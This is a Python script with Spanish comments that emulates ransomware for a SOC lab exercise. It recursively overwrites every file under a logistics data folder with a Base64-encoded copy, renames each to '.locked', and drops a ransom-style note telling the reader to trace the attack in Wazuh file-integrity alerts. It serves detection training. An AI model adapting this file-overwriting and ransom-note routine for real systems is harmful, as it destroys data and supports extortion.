import os
import time
import base64

# Configuración del objetivo
TARGET_DIR = r"C:\Logistics_Data"
EXTENSION = ".locked"
NOTE_NAME = "URGENT_RESTORE_DATA.txt"

def simulate_encryption(filepath):
    """Simula el cifrado leyendo el archivo, codificándolo en Base64 y renombrándolo."""
    try:
        # Leer el contenido original (registros PI/GFR)
        with open(filepath, 'rb') as file:
            original_data = file.read()
        
        # Simular cifrado (ofuscación segura para el laboratorio)
        encrypted_data = base64.b64encode(original_data)
        
        # Sobrescribir el archivo original
        with open(filepath, 'wb') as file:
            file.write(encrypted_data)
        
        # Cambiar la extensión del archivo a .locked
        new_filepath = filepath + EXTENSION
        os.rename(filepath, new_filepath)
        print(f"[!] Cifrado completado: {os.path.basename(new_filepath)}")
    except Exception as e:
        print(f"[-] Error accediendo a {filepath}: {e}")

def drop_ransom_note(directory):
    """Genera la nota de rescate orientada al impacto en la cadena de suministro."""
    note_path = os.path.join(directory, NOTE_NAME)
    note_content = """
    =========================================================
    ⚠️ CRITICAL ALERT: LOGISTICS NETWORK COMPROMISED ⚠️
    =========================================================
    
    All Perpetual Inventory (PI) reconciliations, stock 
    movements, and Good Faith Receiving (GFR) records have 
    been encrypted. 
    
    Inbound logistics and warehouse operations are effectively 
    halted. Do not attempt to modify the .locked files.
    
    This is a controlled SOC laboratory simulation.
    
    To decrypt your files, analyze the FIM alerts in your Wazuh 
    dashboard and document the exact timeline of the attack.
    =========================================================
    """
    with open(note_path, 'w', encoding='utf-8') as note:
        note.write(note_content)
    print(f"\n[+] Nota de rescate desplegada: {NOTE_NAME}")

def main():
    print(f"[*] Iniciando emulación de Ransomware en {TARGET_DIR}...")
    time.sleep(2) 
    
    if not os.path.exists(TARGET_DIR):
        print(f"[-] El directorio {TARGET_DIR} no existe. Ejecuta el generador de datos logísticos primero.")
        return

    encrypted_count = 0
    for root, _, files in os.walk(TARGET_DIR):
        for file in files:
            # Evita cifrar la nota de rescate si se ejecuta varias veces
            if not file.endswith(EXTENSION) and file != NOTE_NAME:
                filepath = os.path.join(root, file)
                simulate_encryption(filepath)
                encrypted_count += 1
                # Retardo de medio segundo para generar logs FIM secuenciales y realistas
                time.sleep(0.5) 

    drop_ransom_note(TARGET_DIR)
    print(f"\n[*] Emulación completada. {encrypted_count} archivos operativos comprometidos.")
    print("[*] Revisa el dashboard de Wazuh (Integrity Monitoring) para iniciar el triaje.")

if __name__ == "__main__":
    main()